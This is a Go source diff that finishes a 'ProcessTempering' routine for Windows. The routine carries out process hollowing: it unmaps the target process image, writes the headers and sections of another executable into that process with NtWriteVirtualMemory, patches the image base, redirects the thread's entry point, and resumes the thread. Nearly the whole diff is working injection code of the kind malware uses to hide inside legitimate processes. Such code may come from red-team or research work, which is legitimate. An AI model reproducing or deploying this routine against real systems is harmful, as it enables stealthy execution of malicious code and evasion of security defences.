@@ -6,6 +6,8 @@ import (
 	"runtime"
 	"syscall"
 	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
 type M128A struct {
@@ -81,8 +83,6 @@ type CONTEXT struct {
 	LastExceptionFromRip uint64
 }
 
-type PIMAGE_NT_HEADERS *IMAGE_NT_HEADERS
-
 // ----------------------------
 
 type IMAGE_FILE_HEADER struct {
@@ -95,16 +95,16 @@ type IMAGE_FILE_HEADER struct {
 	Characteristics      uint16
 }
 
-type IMAGE_OPTIONAL_HEADER struct {
+// 64-bit version of the IMAGE_OPTIONAL_HEADER32
+type IMAGE_OPTIONAL_HEADER64 struct {
 	Magic                       uint16
-	MajorLinkerVersion          uint8
-	MinorLinkerVersion          uint8
+	MajorLinkerVersion          byte
+	MinorLinkerVersion          byte
 	SizeOfCode                  uint32
 	SizeOfInitializedData       uint32
 	SizeOfUninitializedData     uint32
 	AddressOfEntryPoint         uint32
 	BaseOfCode                  uint32
-	BaseOfData                  uint32
 	ImageBase                   uint64
 	SectionAlignment            uint32
 	FileAlignment               uint32
@@ -120,10 +120,10 @@ type IMAGE_OPTIONAL_HEADER struct {
 	CheckSum                    uint32
 	Subsystem                   uint16
 	DllCharacteristics          uint16
-	SizeOfStackReserve          uint32
-	SizeOfStackCommit           uint32
-	SizeOfHeapReserve           uint32
-	SizeOfHeapCommit            uint32
+	SizeOfStackReserve          uint64
+	SizeOfStackCommit           uint64
+	SizeOfHeapReserve           uint64
+	SizeOfHeapCommit            uint64
 	LoaderFlags                 uint32
 	NumberOfRvaAndSizes         uint32
 	IMAGE_DATA_DIRECTORY        [16]struct {
@@ -135,10 +135,12 @@ type IMAGE_OPTIONAL_HEADER struct {
 type IMAGE_NT_HEADERS struct {
 	Signature             uint32
 	IMAGE_FILE_HEADER     IMAGE_FILE_HEADER
-	IMAGE_OPTIONAL_HEADER IMAGE_OPTIONAL_HEADER
+	IMAGE_OPTIONAL_HEADER IMAGE_OPTIONAL_HEADER64
 }
 
-type PIMAGE_OPTIONAL_HEADER *IMAGE_OPTIONAL_HEADER
+type PIMAGE_OPTIONAL_HEADER64 *IMAGE_OPTIONAL_HEADER64
+
+type PIMAGE_NT_HEADERS *IMAGE_NT_HEADERS
 
 // ----------------------------
 
@@ -165,6 +167,30 @@ type IMAGE_DOS_HEADER struct {
 }
 
 type PIMAGE_DOS_HEADER *IMAGE_DOS_HEADER
+
+// ----------------------------
+
+const IMAGE_SIZEOF_SHORT_NAME = 8
+
+type IMAGE_SECTION_HEADER struct {
+	Name [IMAGE_SIZEOF_SHORT_NAME]byte
+	Misc struct {
+		PhysicalAddress uint32
+		VirtualSize     uint32
+	}
+	VirtualAddress       uint32
+	SizeOfRawData        uint32
+	PointerToRawData     uint32
+	PointerToRelocations uint32
+	PointerToLinenumbers uint32
+	NumberOfRelocations  uint16
+	NumberOfLinenumbers  uint16
+	Characteristics      uint32
+}
+
+type PIMAGE_SECTION_HEADER *IMAGE_SECTION_HEADER
+
+// ----------------------------
 
 func ProcessTempering() {
 
@@ -241,6 +267,7 @@ func ProcessTempering() {
 		kernel32DLLVirtualAlloc   = kernel32DLL.NewProc("VirtualAlloc")
 		kernel32DLLVirtualAllocEx = kernel32DLL.NewProc("VirtualAllocEx")
 		kernel32DLLReadFile       = kernel32DLL.NewProc("ReadFile")
+		kernel32DLLVirtualFree    = kernel32DLL.NewProc("VirtualFree")
 	)
 
 	var image uintptr
@@ -285,7 +312,11 @@ func ProcessTempering() {
 		ntDLL                     = syscall.NewLazyDLL("ntdll.dll")
 		ntDLLNtGetContextThread   = ntDLL.NewProc("NtGetContextThread")
 		ntDLLNtReadVirtualMemory  = ntDLL.NewProc("NtReadVirtualMemory")
+		ntDLLNtWriteVirtualMemory = ntDLL.NewProc("NtWriteVirtualMemory")
 		ntDLLNtUnmapViewOfSection = ntDLL.NewProc("NtUnmapViewOfSection")
+		NtSetContextThread        = ntDLL.NewProc("NtSetContextThread")
+		NtResumeThread            = ntDLL.NewProc("NtResumeThread")
+		NtWaitForSingleObject     = ntDLL.NewProc("NtWaitForSingleObject")
 	)
 	processDOSHeader := (PIMAGE_DOS_HEADER)(unsafe.Pointer(image))
 	if processDOSHeader.E_magic != IMAGE_DOS_SIGNATURE {
@@ -299,8 +330,8 @@ func ProcessTempering() {
 
 	var context CONTEXT            // context(any) is actually a CONTEXT structure defined in windows API(winnt.h)
 	context.ContextFlags = 0x10007 // CONTEXT_FULL = 0x10007
-	// pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);
-	// processNTHeaders := (PIMAGE_NT_HEADERS)(unsafe.Pointer(loadedImageDosHeader + uintptr(*(*uint32)(unsafe.Pointer(loadedImageDosHeader + 0x3C)))))
+
+	// Create processNTHeaders variable to store the NT headers of the loaded image according to the architecture
 	processNTHeaders := (PIMAGE_NT_HEADERS)(unsafe.Pointer(image + uintptr(processDOSHeader.E_lfanew)))
 	_, _, err = ntDLLNtGetContextThread.Call(
 		uintptr(processInformation.Thread),
@@ -315,6 +346,7 @@ func ProcessTempering() {
 	}
 
 	// -----------------------------
+	// Allocate virtual memory for the target process
 	var baseAddress uint64
 	if SYSTEM_64BIT {
 		SIZE_T_SIZE := uint64(8) // 64-bit, 8 bytes
@@ -333,24 +365,15 @@ func ProcessTempering() {
 			log.Printf("[+] context.Rdx: 0x%X\n", context.Rdx)
 		}
 	} else if SYSTEM_32BIT {
-		SIZE_T_SIZE := uint64(4) // 32-bit, 4 bytes
-		if _, _, err := ntDLLNtReadVirtualMemory.Call(
-			uintptr(processInformation.Process),
-			uintptr(context.Rbx+(SIZE_T_SIZE*2)),
-			uintptr(unsafe.Pointer(&baseAddress)),
-			uintptr(unsafe.Sizeof(baseAddress)),
-			uintptr(0),
-		); err != syscall.Errno(0) {
-			log.Panicf("[-] Error while reading the virtual memory of the process: %v\n", err)
-			_ = syscall.TerminateProcess(processInformation.Process, 1)
-			return
-		} else {
-			log.Printf("[+] Base Address(x86): %v\n", baseAddress)
-		}
+		// 32-bit is not supported
+		log.Printf("[-] Due to technical situations, 32-bit architecutre is not supported for ProcessTampering\n")
+		_ = syscall.TerminateProcess(processInformation.Process, 1)
+		return
 	}
 
 	// Unmap the original executable image from the target process if its base address matches
-	// Usually not executed
+	// Usually not executed since the base address of the original executable image is different from the base address of the target process
+
 	if baseAddress == processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase {
 		log.Printf("[+] Unmapping the original executable image from the target process: %v\n", baseAddress)
 		if result, _, err := ntDLLNtUnmapViewOfSection.Call(
@@ -379,6 +402,95 @@ func ProcessTempering() {
 		log.Panicf("[-] Error while allocating virtual memory for the target process: %v\n", err)
 		_ = syscall.TerminateProcess(processInformation.Process, 1)
 		return
+	}
+
+	_, _, err = ntDLLNtWriteVirtualMemory.Call(
+		uintptr(processInformation.Process),
+		uintptr(processMemory),
+		uintptr(image),
+		uintptr(processNTHeaders.IMAGE_OPTIONAL_HEADER.SizeOfHeaders),
+		uintptr(0))
+	if err != syscall.Errno(0) {
+		log.Panicf("[-] Error while writing the virtual memory of the process: %v\n", err)
+		_ = syscall.TerminateProcess(processInformation.Process, 1)
+		return
+	}
+
+	// Write the sections of the target executable into the allocated virtual memory via WriteProcessMemory()
+	for i := 0; i < int(processNTHeaders.IMAGE_FILE_HEADER.NumberOfSections); i++ {
+		sectionHeader := (PIMAGE_SECTION_HEADER)(unsafe.Pointer(
+			image +
+				uintptr(processDOSHeader.E_lfanew) +
+				uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS{})) +
+				uintptr(i)*uintptr(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))))
+		_, _, err = ntDLLNtWriteVirtualMemory.Call(
+			uintptr(processInformation.Process),
+			uintptr(processMemory+uintptr(sectionHeader.VirtualAddress)),
+			uintptr(image+uintptr(sectionHeader.PointerToRawData)),
+			uintptr(sectionHeader.SizeOfRawData),
+			uintptr(0))
+		if err != syscall.Errno(0) {
+			log.Panicf("[-] Error while writing the virtual memory of the process: %v\n", err)
+			_ = syscall.TerminateProcess(processInformation.Process, 1)
+			return
+		}
+	}
+
+	// Update the context of the target process to the entry point of the target executable
+	if SYSTEM_64BIT {
+		SIZE_T_SIZE := 8
+		PVOID_SIZE := 8
+		context.Rcx = uint64(processMemory + uintptr(processNTHeaders.IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint))
+		_, _, err = ntDLLNtWriteVirtualMemory.Call(
+			uintptr(processInformation.Process),
+			uintptr(context.Rdx+uint64(SIZE_T_SIZE*2)),
+			uintptr(unsafe.Pointer(&processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase)),
+			uintptr(PVOID_SIZE),
+			uintptr(0))
+		if err != syscall.Errno(0) {
+			log.Panicf("[-] Error while writing the virtual memory of the process: %v\n", err)
+			_ = syscall.TerminateProcess(processInformation.Process, 1)
+			return
+		}
+	}
+
+	// Set the context of the target process to the updated context
+	_, _, _ = NtSetContextThread.Call(
+		uintptr(processInformation.Thread),
+		uintptr(unsafe.Pointer(&context)))
+	_, _, _ = NtResumeThread.Call(
+		uintptr(processInformation.Thread),
+		uintptr(0))
+	_, _, _ = NtWaitForSingleObject.Call(
+		uintptr(processInformation.Process),
+		uintptr(0),
+		uintptr(0))
+	err = syscall.CloseHandle(processInformation.Process)
+	if err != nil {
+		log.Panicf("[-] Error while closing the handles of the process(free'ing Process handle): %v\n", err)
+		return
+	}
+
+	// Close the handles of the process
+	err = syscall.CloseHandle(processInformation.Thread)
+	if err != nil {
+		log.Panicf("[-] Error while closing the handles of the process(free'ing Thread handle): %v\n", err)
+		return
+	}
+
+	// Free the allocated virtual memory for the target executable via VirtualFree()
+	if image != uintptr(0) {
+		_, _, err = kernel32DLLVirtualFree.Call(
+			uintptr(image),
+			uintptr(0),
+			uintptr(windows.MEM_RELEASE))
+		if err != syscall.Errno(0) {
+			log.Panicf("[-] Error while freeing the virtual memory: %v\n", err)
+			return
+		} else {
+			log.Printf("[+] Virtual memory freed: 0x%X\n", image)
+			log.Printf("[+] Process Tempering Completed\n")
+		}
 	}
 
 }
